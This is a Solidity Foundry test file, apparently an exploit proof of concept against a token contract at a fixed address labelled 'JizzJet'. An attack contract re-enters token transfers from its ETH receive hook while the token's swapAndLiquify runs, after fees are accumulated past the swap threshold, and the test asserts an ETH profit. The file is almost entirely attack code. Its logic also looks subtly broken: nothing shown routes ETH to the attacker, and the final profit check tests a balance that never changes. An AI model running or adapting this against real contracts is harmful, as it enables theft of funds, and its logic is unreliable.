pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Minimal IERC20 interface
interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

// Attack contract interface
interface IAttackContract {
    function startAttack(address token) external;
    function transferTokens(address token, address to, uint256 amount) external;
    function withdraw() external;
}

contract AttackContract {
    address public target;
    bool private attacking;
    uint256 private reentrancyCount;
    uint256 private constant MAX_REENTRANCIES = 10;

    constructor() {
        // Constructor
    }

    // Start the attack
    function startAttack(address _target) external {
        target = _target;
        attacking = true;
        reentrancyCount = 0;

        // Transfer tokens to trigger swapAndLiquify
        // Transfer to ourselves to keep tokens in circulation
        uint256 amount = 1000 * 10**9; // Small amount
        IERC20(target).transfer(address(this), amount);

        attacking = false;
    }

    // Helper to transfer tokens (for fee accumulation)
    function transferTokens(address token, address to, uint256 amount) external {
        IERC20(token).transfer(to, amount);
    }

    // Receive ETH - this is where reentrancy happens
    receive() external payable {
        if (attacking && reentrancyCount < MAX_REENTRANCIES) {
            reentrancyCount++;

            // Re-enter by transferring more tokens
            // This happens during the swap when we receive ETH
            uint256 amount = 100 * 10**9; // Small amount
            IERC20(target).transfer(address(this), amount);
        }
    }

    // Withdraw ETH
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    // Get balance
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF2A7429641d1b49a13dCB7E23b67a1a5101231F2;
    address attacker = address(this);
    // Attack contract will be deployed
    AttackContract attack;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: Deploy attack contract and prepare tokens
        attack = new AttackContract();

        // Label addresses for debugging
        vm.label(address(attack), "AttackContract");
        vm.label(TARGET, "JizzJet");

        // Get some initial JizzJet tokens for the attack contract
        // Using deal() to give tokens to attack contract
        deal(TARGET, address(attack), 100_000_000 * 10**9);

        // Ensure swapAndLiquifyEnabled is true (it is by default)
        // We need to make sure the contract has accumulated enough tokens to trigger swapAndLiquify
        // The threshold is numTokensSellToAddToLiquidity = 100000000 * 10**1 * 10**9
        // That's 1,000,000,000,000,000,000,000 tokens (1e21)

        // We'll transfer tokens to create contract balance
        // First, let's check current contract balance
        uint256 contractBalance = IERC20(TARGET).balanceOf(TARGET);
        console.log("Initial contract balance:", contractBalance);

        // If contract balance is below threshold, we need to accumulate more
        // We can do this by transferring tokens with fees
        // Since we're the attacker, we can transfer tokens and pay fees
        // which will accumulate in the contract
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Start the exploit
        console.log("Starting exploit...");

        // Record initial ETH balance of attack contract
        uint256 initialETH = address(attack).balance;
        console.log("Initial attack contract ETH:", initialETH);

        // Get target contract token balance
        uint256 targetBalance = IERC20(TARGET).balanceOf(TARGET);
        console.log("Target contract token balance before:", targetBalance);

        // The threshold for swapAndLiquify is numTokensSellToAddToLiquidity
        // We need to ensure contract has at least this many tokens
        // If not, we need to accumulate fees by transferring tokens

        // First, let's check if we need to accumulate fees
        uint256 threshold = 100000000 * 10**1 * 10**9; // From contract
        console.log("Swap threshold:", threshold);

        if (targetBalance < threshold) {
            console.log("Accumulating fees in contract...");
            // Transfer tokens to pay fees and accumulate in contract
            // We'll transfer from attack contract to another address
            // This will incur fees that go to the contract
            uint256 transferAmount = threshold - targetBalance + 1000 * 10**9;

            // Make sure attack contract has enough tokens
            uint256 attackBalance = IERC20(TARGET).balanceOf(address(attack));
            if (attackBalance < transferAmount) {
                // Give more tokens to attack contract
                deal(TARGET, address(attack), transferAmount * 2);
            }

            // Transfer with fees (to a new address)
            // This will accumulate tokens in the contract
            attack.transferTokens(TARGET, address(0x123), transferAmount);

            // Check new contract balance
            targetBalance = IERC20(TARGET).balanceOf(TARGET);
            console.log("Target contract token balance after accumulation:", targetBalance);
        }

        // Now trigger the swapAndLiquify by transferring tokens
        // The contract will trigger swapAndLiquify when:
        // 1. contractTokenBalance >= numTokensSellToAddToLiquidity
        // 2. !inSwapAndLiquify
        // 3. from != uniswapV2Pair
        // 4. swapAndLiquifyEnabled

        console.log("Triggering swapAndLiquify...");

        // We need to transfer tokens from attack contract to trigger
        // The transfer amount doesn't matter much, just needs to be > 0
        // The key is that contract balance is already above threshold

        // Start the attack - this will trigger reentrancy
        attack.startAttack(TARGET);

        // Check results
        uint256 finalETH = address(attack).balance;
        console.log("Final attack contract ETH:", finalETH);
        console.log("ETH profit:", finalETH - initialETH);

        // Verify exploit succeeded
        assertGt(finalETH, initialETH, "Exploit failed: No ETH profit");
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

